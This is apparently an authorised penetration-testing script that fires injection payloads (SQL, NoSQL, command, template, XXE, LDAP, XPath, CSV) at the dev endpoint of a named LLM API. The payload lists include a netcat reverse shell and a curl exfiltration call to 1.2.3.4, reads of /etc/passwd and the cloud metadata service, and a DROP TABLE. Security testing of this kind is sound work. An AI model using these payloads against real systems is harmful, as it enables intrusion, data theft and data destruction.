#!/usr/bin/env python3
"""Injection probe for Lazarus AI LLM API.

Tests:
- SQL injection via input.prompt and nested JSON fields
- NoSQL injection (MongoDB operators in JSON body)
- Command injection via file.url and prompt strings
- XXE via document upload (if XML processing occurs downstream)
- Template injection (SSTI) in prompt field
- LDAP / XPath injection probes

ROE: Amendment 04, Section 3.4 — Dev API only.
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path
from typing import Any

from fuzz_utils import run_probe_iterations


def build_injection_payloads() -> list[tuple[str, bytes | str, dict[str, Any] | None]]:
    """Build injection test payloads.

    Returns list of (prompt, file_data, extra_settings).
    file_data is base64-encoded bytes (a minimal PDF) for most probes.
    """
    # Minimal valid PDF header as bytes for inline base64 upload
    minimal_pdf = b"%PDF-1.4\n1 0 obj\n\u003c\u003c/Type /Catalog /Pages 2 0 R\u003e\u003e\nendobj\n2 0 obj\n\u003c\u003c/Type /Pages /Kids [] /Count 0\u003e\u003e\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000052 00000 n\ntrailer\n\u003c\u003c/Size 3 /Root 1 0 R\u003e\u003e\nstartxref\n101\n%%EOF"

    sql_payloads = [
        "What is this document? ' OR '1'='1",
        'What is this document? " OR "1"="1',
        "What is this document? 1'; DROP TABLE documents; --",
        "What is this document? 1 UNION SELECT null, version(), null --",
        "What is this document? 1' AND 1=1 --",
        "What is this document? 1' AND 1=2 --",
        "What is this document? 1'; EXEC xp_cmdshell('whoami') --",
        "What is this document? 1; SELECT * FROM pg_authid --",
        "What is this document? {\"$ne\": null}",
        "What is this document? {\"$gt\": \"\"}",
    ]

    nosql_payloads = [
        "What is this document?",
        "What is this document?",
        "What is this document?",
    ]

    cmd_payloads = [
        "What is this document? $(whoami)",
        "What is this document? `id`",
        "What is this document? ; cat /etc/passwd",
        "What is this document? | nc -e /bin/sh 1.2.3.4 4444",
        "What is this document? & ping -c 1 1.2.3.4",
        "What is this document? $(curl http://1.2.3.4/exfil)",
    ]

    ssti_payloads = [
        "What is this document? {{7*7}}",
        "What is this document? {{config}}",
        "What is this document? {% import os %}{{os.system('id')}}",
        "What is this document? ${{7*7}}",
        "What is this document? <%= 7 * 7 %\u003e",
    ]

    xxe_payloads = [
        'What is this document? <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        'What is this document? <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ]

    ldap_payloads = [
        "What is this document? *)(uid=*))(&(uid=*",
        "What is this document? admin)(&))",
        "What is this document? *))(&(",
    ]

    xpath_payloads = [
        "What is this document? ' or '1'='1",
        "What is this document? ] | //*",
        "What is this document? count(//*)&gt;0",
    ]

    csv_injection_payloads = [
        "What is this document? =cmd|' /C calc'!A0",
        "What is this document? +cmd|' /C notepad'!A0",
    ]

    # Build unified list with category tags in prompt
    payloads: list[tuple[str, bytes | str, dict[str, Any] | None]] = []
    for p in sql_payloads:
        payloads.append((f"[SQLI] {p}", minimal_pdf, None))
    for p in nosql_payloads:
        payloads.append((f"[NOSQL] {p}", minimal_pdf, None))
    for p in cmd_payloads:
        payloads.append((f"[CMDI] {p}", minimal_pdf, None))
    for p in ssti_payloads:
        payloads.append((f"[SSTI] {p}", minimal_pdf, None))
    for p in xxe_payloads:
        payloads.append((f"[XXE] {p}", minimal_pdf, None))
    for p in ldap_payloads:
        payloads.append((f"[LDAP] {p}", minimal_pdf, None))
    for p in xpath_payloads:
        payloads.append((f"[XPATH] {p}", minimal_pdf, None))
    for p in csv_injection_payloads:
        payloads.append((f"[CSV] {p}", minimal_pdf, None))

    # NoSQL operator injection in the JSON body itself (extra_settings)
    payloads.append(
        (
            "[NOSQL_BODY] What is this document?",
            minimal_pdf,
            {"$where": "sleep(5000)"},
        )
    )
    payloads.append(
        (
            "[NOSQL_BODY] What is this document?",
            minimal_pdf,
            {"$gt": ""},
        )
    )

    # XXE via URL that returns XML
    payloads.append(
        (
            "[XXE_URL] Describe this XML document",
            "http://example.com/xxe.xml",
            None,
        )
    )

    # Command injection via file.url
    payloads.append(
        (
            "[CMDI_URL] Describe this document",
            "http://example.com;id",
            None,
        )
    )
    payloads.append(
        (
            "[CMDI_URL] Describe this document",
            "http://example.com|whoami",
            None,
        )
    )

    return payloads


def main():
    parser = argparse.ArgumentParser(description="Injection probe for Lazarus LLM API")
    parser.add_argument("--endpoint", default="https://api-dev.gcp.lzrops.com/api/engine/internal")
    parser.add_argument("--authkey", required=True)
    parser.add_argument("--orgid", required=True)
    parser.add_argument("--output-dir", type=Path, default=Path("results/fuzz"))
    parser.add_argument("--delay", type=float, default=2.0)
    args = parser.parse_args()

    payloads = build_injection_payloads()
    print(f"[INJ] Running {len(payloads)} injection probes")

    session = run_probe_iterations(
        probe_name="injection",
        endpoint=args.endpoint,
        authkey=args.authkey,
        orgid=args.orgid,
        payloads=payloads,
        delay=args.delay,
        output_dir=args.output_dir,
    )

    print(f"\n[INJ] Complete: {len(session.iterations)} iterations, {len(session.findings)} findings")
    for f in session.findings:
        print(f"  ! {f}")

    if session.findings:
        sys.exit(2)
    sys.exit(0)


if __name__ == "__main__":
    main()
